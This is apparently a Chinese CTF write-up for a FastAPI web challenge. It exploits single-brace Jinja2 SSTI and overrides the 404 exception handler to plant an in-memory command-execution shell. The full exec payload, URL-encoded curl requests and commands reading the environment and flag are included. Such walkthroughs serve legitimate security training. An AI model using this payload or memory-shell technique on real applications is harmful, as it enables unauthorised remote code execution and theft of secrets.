# [玄武杯 2025]ez_fastapi

## 题目信息

- 类型：Web
- 题目状态：已解出
- 目标：http://node1.anna.nssctf.cn:22800/
- 核心漏洞：FastAPI 中自定义 Jinja2 分隔符导致的 SSTI，随后通过覆盖 404 异常处理器实现内存 RCE

## Flag

`NSSCTF{4adf5ec1-5a07-4bf6-a40e-10c844a3b94b}`

## 入口与现象

先访问首页和 OpenAPI：

```text
GET /
GET /openapi.json
```

接口面非常小，只有两个路由：

```json
{
  "/": "GET",
  "/shellMe": "GET"
}
```

`/shellMe` 有一个查询参数 `username`，但无论传什么普通值，页面都还是：

```html
<h1>Welcome Guest</h1>
```

这说明 `username` 不是直接体现在返回页里，而是很可能被用于别的后端逻辑。

接着测试花括号：

```text
/shellMe?username={
/shellMe?username={{7*7}}
/shellMe?username={{config}}
```

可以观察到：

- 传入普通值时，页面始终正常返回 `Welcome Guest`
- 传入单个 `{` 时直接 `500 Internal Server Error`
- 这类现象很像模板字符串在后端被额外解释

## 分析过程

拿到 RCE 之后，先读了 `/app/app.py`，关键源码如下：

```python
from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse
from fastapi.templating import Jinja2Templates
from jinja2 import Environment
import uvicorn

app = FastAPI()
templates = Jinja2Templates(directory="templates")

Jinja2 = Environment(variable_start_string='{', variable_end_string='}')

@app.exception_handler(404)
async def handler_404(request, exc):
    return JSONResponse(status_code=404, content={"message": "Not found"})

@app.get("/shellMe")
async def shellMe(request: Request, username="Guest"):
    Jinja2.from_string("Welcome " + username).render()
    return templates.TemplateResponse("shellme.html", {"request": request})

def method_disabled(*args, **kwargs):
    raise NotImplementedError("此路不通！该方法已被管理员禁用。")

app.add_api_route = method_disabled
app.add_middleware = method_disabled
```

这里有两个关键点：

1. 题目单独创建了一个 Jinja2 环境，并把变量分隔符改成了单花括号：

```python
Jinja2 = Environment(variable_start_string='{', variable_end_string='}')
```

所以这里不是常见的 `{{ ... }}`，而是：

```text
{表达式}
```

2. `username` 被直接拼进模板字符串后执行：

```python
Jinja2.from_string("Welcome " + username).render()
```

这就是标准的 SSTI，而且是无回显 SSTI，因为最终响应返回的是固定模板 `shellme.html`，不是 `render()` 的结果。

## 为什么不能直接加新路由

源码里还把下面两个方法禁掉了：

```python
app.add_api_route = method_disabled
app.add_middleware = method_disabled
```

也就是说常规的“内存马加新路由”走不通，需要找别的可持久化利用点。

但 `app.add_exception_handler` 没有被禁，所以可以改写 404 处理器，把不存在路径变成命令执行入口。

## 利用过程

### 第一步：利用 SSTI 覆盖 404 处理器

核心思路是：

1. 通过 Jinja2 SSTI 调用 `exec`
2. 获取当前运行中的 `FastAPI` app 对象
3. 用 `add_exception_handler` 注册新的 404 处理器
4. 在处理器里读取 `cmd` 参数并用 `os.popen` 执行
5. 重建 `middleware_stack` 使新处理器生效

实际 payload 如下：

```text
{lipsum.__globals__['__builtins__']['exec']("__import__('sys').modules['app'].app.add_exception_handler(404,lambda request, exc:__import__('sys').modules['app'].app.__init__.__globals__['JSONResponse'](content={'message':__import__('os').popen(request.query_params.get('cmd') or 'whoami').read()}));app=__import__('sys').modules['app'].app;app.middleware_stack=app.build_middleware_stack()")}
```

发包：

```bash
curl "http://node1.anna.nssctf.cn:22800/shellMe?username=%7Blipsum.__globals__%5B'__builtins__'%5D%5B'exec'%5D(%22__import__('sys').modules%5B'app'%5D.app.add_exception_handler(404,lambda%20request,%20exc:__import__('sys').modules%5B'app'%5D.app.__init__.__globals__%5B'JSONResponse'%5D(content=%7B'message':__import__('os').popen(request.query_params.get('cmd')%20or%20'whoami').read()%7D));app=__import__('sys').modules%5B'app'%5D.app;app.middleware_stack=app.build_middleware_stack()%22)%7D"
```

这一步页面依旧返回固定的 `Welcome Guest`，但内存中的 404 处理器已经被改掉了。

### 第二步：访问不存在路径验证 RCE

访问任意不存在路径：

```bash
curl "http://node1.anna.nssctf.cn:22800/nope?cmd=whoami"
```

返回：

```json
{"message":"ctf_user\n"}
```

继续验证：

```bash
curl "http://node1.anna.nssctf.cn:22800/notfound?cmd=id"
```

返回：

```json
{"message":"uid=1000(ctf_user) gid=1000(ctf_user) groups=1000(ctf_user)\n"}
```

说明命令执行已经拿到。

### 第三步：读取环境变量拿 flag

先看根目录：

```bash
curl "http://node1.anna.nssctf.cn:22800/zzz?cmd=ls%20/"
```

返回能看到：

```text
app
bin
boot
dev
etc
flag
home
...
```

再直接读环境变量：

```bash
curl "http://node1.anna.nssctf.cn:22800/zzz?cmd=printenv"
```

返回里可以直接看到：

```text
FLAG=NSSCTF{4adf5ec1-5a07-4bf6-a40e-10c844a3b94b}
```

这就是本题 flag。

## 关键 payload / 命令

```text
SSTI:
{lipsum.__globals__['__builtins__']['exec']("__import__('sys').modules['app'].app.add_exception_handler(404,lambda request, exc:__import__('sys').modules['app'].app.__init__.__globals__['JSONResponse'](content={'message':__import__('os').popen(request.query_params.get('cmd') or 'whoami').read()}));app=__import__('sys').modules['app'].app;app.middleware_stack=app.build_middleware_stack()")}

验证 RCE:
curl "http://node1.anna.nssctf.cn:22800/nope?cmd=whoami"

拿 flag:
curl "http://node1.anna.nssctf.cn:22800/zzz?cmd=printenv"
```

## 总结

这题的关键不是传统的 `{{ ... }}`，而是源码里把 Jinja2 变量分隔符改成了单花括号 `{ ... }`，所以普通 SSTI 测试姿势很容易走偏。

同时题目专门禁掉了 `add_api_route` 和 `add_middleware`，逼着我们换个角度做“内存持久化”。最终通过覆盖 404 异常处理器，把任意不存在路径变成命令执行入口，再从环境变量里直接拿到 flag。
